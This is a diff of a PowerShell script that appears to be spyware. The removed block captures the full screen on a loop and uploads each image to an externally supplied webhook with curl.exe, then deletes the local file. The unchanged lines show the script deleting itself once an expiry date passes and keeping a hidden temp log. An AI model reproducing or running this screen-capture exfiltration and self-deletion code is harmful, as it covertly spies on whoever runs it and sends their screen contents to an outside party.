@@ -1,6 +1,3 @@
-# Ensure that the webhook URL is set directly from the command line
-$webhookURL = $dc  # $webhookURL is the variable passed via the command line
-
 # Define the path to the temp log file
 $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')
 
@@ -20,37 +17,6 @@ if ($currentDate -gt $expiryDate) {
     Write-Host "Script has expired. Deleting script file..."
     Remove-Item $MyInvocation.MyCommand.Path -Force
     exit
-}
-
-# Shortened URL Detection and Handling
-if ($webhookURL.Ln -ne 121){
-    Write-Host "Shortened Webhook URL Detected.."
-    $webhookURL = (irm $webhookURL).url
-}
-
-# Screenshot Capture Loop
-$seconds = 10 # Screenshot interval
-$a = 1 # Screenshot amount
-
-While ($a -gt 0){
-    $Filett = "$env:temp\SC.png"
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-type -AssemblyName System.Drawing
-    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $Width = $Screen.Width
-    $Height = $Screen.Height
-    $Left = $Screen.Left
-    $Top = $Screen.Top
-    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-    Start-Sleep 1
-    curl.exe -F "file1=@$filett" $webhookURL
-    Start-Sleep 1
-    Remove-Item -Path $filett
-    Start-Sleep $seconds
-    $a--
 }
 
 # Check if the custom utility type is already loaded
